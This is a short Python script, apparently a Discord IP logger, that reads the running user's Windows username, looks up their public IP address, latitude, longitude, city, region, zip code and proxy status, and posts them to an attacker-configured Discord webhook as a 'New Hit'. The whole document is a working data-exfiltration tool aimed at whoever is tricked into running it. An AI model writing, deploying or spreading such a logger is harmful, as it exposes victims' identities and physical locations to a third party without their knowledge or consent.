from dhooks import Embed, Webhook
import requests, os, time, base64, json

usr = os.getlogin()
with open(f"C:/Users/{usr}/Desktop/Discord-Ip-Logger/config.json") as config_file:
    configuration = json.load(config_file)

WebhookURL = configuration["discordWebhook"] 

baseURL = 'https://freeipapi.com/api/json'
Content = requests.get(baseURL)
information = Content.json()
##-------------------------
ipVersion = information['ipVersion']
ipAddress = information['ipAddress']
latitude = information['latitude']
longitude = information['longitude']
country = information['countryName']
region = information['regionName']
zip_code = information['zipCode']
city = information['cityName']
isProxy = information['isProxy']
import sys
##-------------------------
##-------------------------
hook = Webhook(WebhookURL)

embed = Embed(
    description=f'New Hit || PC; {usr} :zzz:',
    color=0x5CDBF0,
    timestamp='now'  # sets the timestamp to current time
    )


embed.set_author(name=f'Ip & Version: || {ipVersion} || {ipAddress}')
embed.add_field(name=f"Lat & Longitude :star: ", value=f'Latitude: {latitude}  Longitude: {longitude} ')
embed.add_field(name=f'Region & City', value=f'State: {region}, City: {city}')
embed.add_field(name=f'Zip Code & Proxies', value=f'Has Proxie: {isProxy}, ZipCode: {zip_code}')
embed.add_field(name=f'Directorys', value=f'Size: {sys.getsizeof('Downloads')}')
embed.set_footer(text=f'Smoking on {usr}')

hook.send(embed=embed)